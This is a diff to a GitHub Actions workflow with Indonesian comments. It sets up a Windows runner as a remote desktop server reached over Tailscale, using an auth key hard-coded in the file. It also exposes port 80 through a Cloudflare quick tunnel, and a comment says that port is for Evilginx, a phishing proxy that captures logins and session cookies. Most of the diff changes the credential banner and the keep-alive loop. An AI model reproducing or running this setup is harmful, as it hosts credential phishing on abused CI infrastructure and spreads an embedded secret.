@@ -65,7 +65,6 @@ jobs:
           Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
           
           # Mengaktifkan Tailscale menggunakan Auth Key yang kamu berikan
-          # Catatan: Di Windows kita menggunakan file exe yang sudah terinstal
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=tskey-auth-kECPu5LrrG11CNTRL-quozA5xYVciuGznheYVLdihYeiBz76aQ6 --hostname=gh-runner-$env:GITHUB_RUN_ID
 
       - name: Final Setup & Maintain Connection
@@ -74,20 +73,23 @@ jobs:
           $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
           
           Write-Host "`n==============================================="
-          Write-Host "✅ RDP READY!"
-          Write-Host "Address: $tsIP"
-          Write-Host "Username: RDP"
-          Write-Host "Password: $env:RDP_PASS"
-          Write-Host "Evilginx Path: $env:EVIL_PATH"
+          Write-Host "✅ SERVER SUDAH SIAP DIHUBUNGKAN!"
+          Write-Host "-----------------------------------------------"
+          Write-Host "📍 IP TAILSCALE RUNNER: $tsIP"
+          Write-Host "👤 USERNAME RDP: RDP"
+          Write-Host "🔑 PASSWORD RDP: $env:RDP_PASS"
+          Write-Host "-----------------------------------------------"
+          Write-Host "🚀 CARA HUBUNGKAN DARI UBUNTU (WSL):"
+          Write-Host "Ketik ini di terminal Ubuntu kamu:"
+          Write-Host "ping $tsIP"
           Write-Host "===============================================`n"
           
           # Menjalankan Cloudflare Quick Tunnel (Port 80 untuk Evilginx)
-          # Link .trycloudflare.com akan muncul di log GitHub Actions
           Start-Process -FilePath "C:\Program Files (x86)\cloudflared\cloudflared.exe" -ArgumentList "tunnel", "--url", "http://localhost:80" -NoNewWindow
 
-          # Loop untuk menjaga runner tetap hidup selama 6 jam (batas GitHub)
+          # Loop untuk menjaga runner tetap hidup
           while ($true) {
               $currentTime = Get-Date -Format "HH:mm:ss"
-              Write-Host "[$currentTime] Runner Active & Tunneling... Masuk ke RDP via Tailscale IP!"
+              Write-Host "[$currentTime] Runner Terhubung ke Tailscale. Menunggu instruksi dari Ubuntu..."
               Start-Sleep -Seconds 300
           }
